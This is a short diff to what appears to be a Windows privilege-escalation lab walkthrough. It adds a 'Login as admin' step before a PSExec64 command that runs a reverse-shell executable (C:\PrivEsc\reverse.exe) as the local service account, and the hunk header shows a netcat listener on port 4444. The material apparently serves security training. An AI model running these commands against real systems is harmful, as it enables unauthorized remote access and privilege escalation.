@@ -1924,7 +1924,8 @@ nc -lnvp 4444
      
      
      ## 2. Run PSExec64.exe
-     
+
+     Login as **`admin`**
      
      ```ruby
      C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
